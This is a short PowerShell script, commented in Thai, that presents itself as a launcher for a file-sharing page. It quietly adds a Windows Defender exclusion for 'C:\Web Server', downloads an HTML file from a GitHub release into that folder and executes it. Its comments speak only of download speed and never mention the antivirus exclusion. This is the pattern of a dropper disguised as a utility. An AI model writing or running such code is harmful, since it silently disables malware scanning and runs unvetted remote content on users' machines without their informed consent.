# --- Configuration ---
$dirPath = "C:\Web Server"
$filePath = "$dirPath\Upload.Share.html"
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Upload.Share.html"

# 1. สร้างโฟลเดอร์และตั้งค่า Exclusion (Windows Defender)
if (!(Test-Path $dirPath)) {
    New-Item -Path $dirPath -ItemType Directory -Force | Out-Null
}
Add-MpPreference -ExclusionPath $dirPath

# 2. ตั้งค่า Network & Download Optimization
# บังคับใช้ TLS 1.2 เพื่อความเสถียรและเร็วขึ้น
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ปิด Progress Bar เพื่อลดการใช้ทรัพยากร UI (ทำให้ดาวน์โหลดเร็วขึ้น)
$ProgressPreference = 'SilentlyContinue'

# 3. ดาวน์โหลดไฟล์โดยใช้ .NET WebClient (Synchronous)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $filePath)
    
    # 4. รันไฟล์ที่ดาวน์โหลดมา
    Start-Process $filePath
    
    # คืนค่า Progress Bar
    $ProgressPreference = 'Continue'
}
catch {
    Write-Host "เกิดข้อผิดพลาดในการดาวน์โหลด: $_" -ForegroundColor Red
    exit
}

# 5. ส่วนโต้ตอบการลบข้อมูล
Clear-Host
Write-Host "==============================" -ForegroundColor Cyan
$choice = Read-Host "คุณต้องการลบ 'ฝากไฟล์ & แชร์ไฟล์' (โฟลเดอร์ $dirPath) หรือไม่? (Y/N)"
Write-Host "==============================" -ForegroundColor Cyan

if ($choice -eq "Y" -or $choice -eq "y") {
    if (Test-Path $dirPath) {
        Remove-Item -Path $dirPath -Recurse -Force
        Write-Host "ลบโฟลเดอร์เรียบร้อยแล้ว" -ForegroundColor Yellow
    }
}
else {
    Write-Host "คุณสามารถ บันทึกเป็น 'แถบรายการโปรด' เพื่อเรียกใช้ ฝากไฟล์ & แชร์ไฟล์ ได้สะดวกยิ่งขึ้น" -ForegroundColor Green
}

Pause
